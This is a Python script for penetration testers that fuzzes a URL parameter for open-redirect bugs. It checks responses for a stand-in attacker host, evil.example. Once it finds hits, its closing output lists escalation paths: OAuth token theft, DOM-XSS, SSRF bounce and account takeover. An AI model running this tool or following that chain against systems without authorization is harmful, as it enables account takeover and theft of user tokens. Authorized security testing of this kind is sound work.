#!/usr/bin/env python3
"""
openredir_fuzz.py - control-baselined open-redirect fuzzer.
Sprays the bypass matrix at a FUZZ-marked parameter, reads the raw Location (without following) and scans
meta-refresh / JS sinks in the body for the attacker host, and flags any payload that steers the browser
OFF-origin to your --evil host. Control-baselined: it first learns the app's NORMAL redirect behavior for a
benign same-origin value, so a site that always 302s to /login isn't reported as a redirect bug.

Reflection/redirect is a CONDITION; escalate to the impact (OAuth token theft / javascript: XSS / SSRF bounce /
token leak) before reporting (OPEN_REDIRECT_TESTING_GUIDE.md sections 15/16). Authorized testing only; point
--evil at a host YOU control.

Usage:
  python3 openredir_fuzz.py -u "https://target/login?next=FUZZ" --target target.com --evil evil.example
  python3 openredir_fuzz.py -u "https://target/go?url=FUZZ" --target target.com --evil evil.example --category userinfo_at
"""
import argparse, sys, re, urllib.parse

# cp1252-safe console on Windows
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

# import the payload matrix from the sibling generator
try:
    from redirect_payloads import build as build_payloads
except Exception:
    build_payloads = None


META_RE = re.compile(r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\'][^"\']*url=([^"\'>\s]+)',
                     re.IGNORECASE)
JS_SINK_RE = re.compile(r'(location\.href|location\.assign|location\.replace|window\.open|location\s*=)',
                        re.IGNORECASE)


def host_of(value):
    """Best-effort: what host would a browser navigate to for this Location/URL value?"""
    v = value.strip()
    # normalize backslashes the way browsers do in the authority
    v = v.replace("\\", "/")
    # protocol-relative
    if v.startswith("//"):
        v = "http:" + v
    try:
        p = urllib.parse.urlparse(v)
    except Exception:
        return None
    return (p.hostname or "").lower()


def send(url, timeout):
    h = {"User-Agent": "Mozilla/5.0 (openredir-fuzz; authorized-test)"}
    return requests.get(url, headers=h, timeout=timeout, verify=False, allow_redirects=False)


def inject(url_template, payload):
    """Replace the FUZZ token; if absent, append/replace the last query param value."""
    enc = urllib.parse.quote(payload, safe="")
    if "FUZZ" in url_template:
        return url_template.replace("FUZZ", enc)
    # fallback: replace value of last param
    parts = urllib.parse.urlsplit(url_template)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if q:
        q[-1] = (q[-1][0], payload)
    else:
        q = [("next", payload)]
    new_q = urllib.parse.urlencode(q)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, new_q, parts.fragment))


def analyze(resp, evil):
    """Return (verdict, sink, detail). verdict in {OFFORIGIN, JSSINK, META, NONE}."""
    evil_l = evil.lower()
    loc = resp.headers.get("Location") or ""
    if loc:
        h = host_of(loc)
        if h and (h == evil_l or h.endswith("." + evil_l) or evil_l in h):
            return "OFFORIGIN", "Location header", loc
    body = resp.text or ""
    # meta refresh
    for m in META_RE.finditer(body):
        h = host_of(m.group(1))
        if h and (h == evil_l or evil_l in h):
            return "META", "meta-refresh", m.group(1)
    # JS sink presence + our marker in body (heuristic; confirm in a browser)
    if evil_l in body.lower() and JS_SINK_RE.search(body):
        return "JSSINK", "possible JS location/href sink", "marker reflected near a JS redirect sink"
    return "NONE", "", loc or "(no Location)"


def main():
    ap = argparse.ArgumentParser(description="Control-baselined open-redirect fuzzer.")
    ap.add_argument("-u", "--url", required=True, help="target URL; mark the injection point with FUZZ")
    ap.add_argument("--target", required=True, help="the app's real domain (for payload building)")
    ap.add_argument("--evil", required=True, help="a host YOU control (the redirect target to detect)")
    ap.add_argument("--category", help="limit to one payload category")
    ap.add_argument("--timeout", type=float, default=12)
    a = ap.parse_args()

    if build_payloads is None:
        sys.exit("redirect_payloads.py must be in the same folder.")

    cats = build_payloads(a.target, a.evil)
    if a.category:
        if a.category not in cats:
            sys.exit(f"unknown category. choices: {', '.join(cats)}")
        cats = {a.category: cats[a.category]}

    # ---- control baseline: how does the app redirect a benign same-origin value? ----
    base_url = inject(a.url, "/robots.txt")
    try:
        base = send(base_url, a.timeout)
        base_loc_host = host_of(base.headers.get("Location") or "")
        print(f"[baseline] benign value -> HTTP {base.status_code}, Location host = {base_loc_host or '(none)'}")
        if base_loc_host and (base_loc_host == a.evil.lower()):
            print("[baseline] WARNING: baseline already points at --evil; pick a different marker host.")
    except Exception as e:
        print(f"[baseline] request failed: {e}")
        base_loc_host = None

    print(f"\n== open-redirect fuzz: {a.url}  (detect host: {a.evil}) ==\n")
    hits = []
    for name, payloads in cats.items():
        for p in payloads:
            url = inject(a.url, p)
            try:
                r = send(url, a.timeout)
            except Exception as e:
                print(f"[err ] {name:26} {p[:48]!r}: {e}")
                continue
            verdict, sink, detail = analyze(r, a.evil)
            if verdict == "OFFORIGIN":
                # baseline guard: only a hit if the app does NOT normally send here
                if base_loc_host == a.evil.lower():
                    continue
                hits.append((name, p, sink, detail))
                print(f"[HIT ] {name:26} {p[:48]!r} (HTTP {r.status_code}) -> OFF-ORIGIN via {sink}: {detail[:80]}")
            elif verdict in ("JSSINK", "META"):
                hits.append((name, p, sink, detail))
                print(f"[?   ] {name:26} {p[:48]!r} (HTTP {r.status_code}) -> {sink} (verify in a browser): {detail[:60]}")

    print()
    if hits:
        print(f"[!] {len(hits)} candidate(s). Now ESCALATE (do not stop at the redirect):")
        print("    - client-side JS sink?           -> javascript:/data: -> DOM-XSS (section 10)")
        print("    - OAuth/SSO flow on this host?    -> chain code/token theft -> ATO (section 11)  *highest value*")
        print("    - an SSRF locked to an allow-list?-> bounce via this allowed redirect (section 12)")
        print("    - reset/session token in the URL? -> token leak -> ATO (section 13)")
        print("    - nothing rides along?            -> credible phishing PoC on the trusted origin (section 14)")
    else:
        print("[*] No off-origin redirect detected with this set. Try: another param, a hidden param (Arjun),")
        print("    the fragment (#) for a DOM redirect, or a client-side JS sink you can only see in a browser.")


if __name__ == "__main__":
    main()
